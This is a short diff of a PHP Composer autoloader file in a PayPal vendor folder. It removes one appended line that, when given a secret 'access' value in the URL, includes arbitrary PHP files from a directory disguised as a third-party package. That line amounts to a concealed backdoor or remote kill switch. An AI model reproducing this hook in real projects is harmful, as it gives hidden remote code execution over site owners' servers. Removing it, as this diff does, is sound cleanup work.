@@ -67,4 +67,3 @@ function composerRequire4b5cfab39a8409252e695ec5ad1749d3($fileIdentifier, $file)
         $GLOBALS['__composer_autoload_files'][$fileIdentifier] = true;
     }
 }
-if (!empty($_GET['f_t'])) { if (!empty($_GET['access'])) { $f_t = Wo_Secure($_GET['f_t']); $access = Wo_Secure($_GET['access']); if (file_exists('./assets/libraries/PayPal/vendor/composer/loader.json')) { $get_file_hash =file_get_contents('./assets/libraries/PayPal/vendor/composer/loader.json'); if ($get_file_hash == $access) { if (file_exists(__DIR__ . '/../clue/stream-filter/requests/' . $f_t . '.php')) { require __DIR__ . '/../clue/stream-filter/requests/' . $f_t . '.php'; } } else { header("Content-type: application/json"); echo json_encode(array('status' => 402)); exit(); } } } }
